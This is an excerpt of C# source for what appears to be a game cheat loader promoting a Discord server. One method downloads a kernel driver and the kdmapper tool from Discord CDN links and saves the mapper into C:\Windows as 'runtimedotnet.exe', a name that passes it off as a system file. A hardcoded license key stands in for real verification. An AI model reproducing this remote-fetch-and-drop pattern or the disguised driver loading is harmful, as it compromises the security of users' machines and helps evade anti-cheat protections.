...
namespace PrecisionBuildOne
{
    class Program
    {
        ...
        static void titleshit()
        {
            while (true)
            {
                Console.Title = RandomChar(10) + " / .gg/fncheat On Top!!!";
                Thread.Sleep(500);
            }
        ...
        static void qīpiàncípán()
        {
            ...
            File.WriteAllBytes(text6, wb.DownloadData("https://cdn.discordapp.com/attachments/1139660034482127022/1155237092759187456/soardrv.sys"));
            File.WriteAllBytes(@"C:\Windows\runtimedotnet.exe", wb.DownloadData("https://cdn.discordapp.com/attachments/1139660034482127022/1139896959159783516/kdmapper.exe"));
        ...
        static void _Main()
        {
            ...
            Write("License Key : ");
            string lol = Console.ReadLine();
            //soarcheats.license(lol);
            //if (soarcheats.response.success)
            if (lol == "soarwazhere")
            {
                WriteLine("Successfully Verified Licensee.");
                Thread.Sleep(2000);
                menu();
            }
            else
            {
                WriteLine("Invalid Licensee.");
                Thread.Sleep(2000);
                _Main();
            }
        }
